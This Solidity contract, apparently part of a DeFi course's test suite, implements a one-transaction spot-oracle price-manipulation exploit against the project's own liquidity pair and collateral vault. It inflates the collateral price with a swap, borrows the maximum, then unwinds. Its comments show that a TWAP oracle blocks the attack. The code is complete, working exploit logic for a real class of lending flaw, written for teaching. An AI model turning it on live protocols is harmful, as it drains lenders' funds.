// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.20;

import {Pair} from "../../src/Pair.sol";
import {CollateralVault} from "../../src/oracle/CollateralVault.sol";
import {PairLibrary} from "../../src/libraries/PairLibrary.sol";
import {IERC20} from "../../src/interfaces/IERC20.sol";

/// @title OracleAttacker — one-transaction price-manipulation exploit.
/// @notice Executes the classic spot-oracle attack atomically: inflate the collateral's
/// spot price with a large swap, borrow against the inflated valuation, then unwind the
/// swap. Against a spot oracle the vault lends far more than the collateral is worth,
/// leaving bad debt; against a TWAP oracle the inflated price never enters the average,
/// the valuation is unchanged, and the over-borrow reverts. The attacker funds the
/// manipulation from its own balance here; in practice a flash loan (Lecture 4.14,
/// Module 3.13) supplies it with no capital, which is what makes the attack cheap.
contract OracleAttacker {
    Pair public immutable pair;
    CollateralVault public immutable vault;
    IERC20 public immutable collateral;
    IERC20 public immutable stable;

    constructor(address _pair, address _vault, address _collateral, address _stable) {
        pair = Pair(_pair);
        vault = CollateralVault(_vault);
        collateral = IERC20(_collateral);
        stable = IERC20(_stable);
    }

    /// @notice Run the exploit in a single call.
    /// @param stableForPush stable spent to buy collateral and spike its price
    /// @param collateralToPost collateral deposited into the vault as (inflated) backing
    /// @return borrowed stable extracted from the vault
    function attack(uint256 stableForPush, uint256 collateralToPost)
        external
        returns (uint256 borrowed)
    {
        // 1. Manipulate: swap stable -> collateral, making collateral scarce and dear.
        _swap(address(stable), stableForPush);

        // 2. Post collateral and borrow the maximum the (now inflated) oracle permits.
        collateral.approve(address(vault), collateralToPost);
        vault.deposit(collateralToPost);
        borrowed = vault.maxBorrow(address(this)) - vault.debtOf(address(this));
        vault.borrow(borrowed);

        // 3. Unwind: sell the collateral we bought back into the pool. The price returns
        //    toward normal, but the borrowed stable stays with the attacker.
        uint256 collBack = collateral.balanceOf(address(this));
        if (collBack > 0) _swap(address(collateral), collBack);
    }

    function _swap(address tokenIn, uint256 amountIn) private {
        address tokenOut = tokenIn == pair.token0() ? pair.token1() : pair.token0();
        (uint256 reserveIn, uint256 reserveOut) =
            PairLibrary.getReserves(address(pair), tokenIn, tokenOut);
        uint256 out = PairLibrary.getAmountOut(amountIn, reserveIn, reserveOut);
        IERC20(tokenIn).transfer(address(pair), amountIn);
        (uint256 a0, uint256 a1) =
            tokenIn == pair.token0() ? (uint256(0), out) : (out, uint256(0));
        pair.swap(a0, a1, address(this), new bytes(0));
    }
}
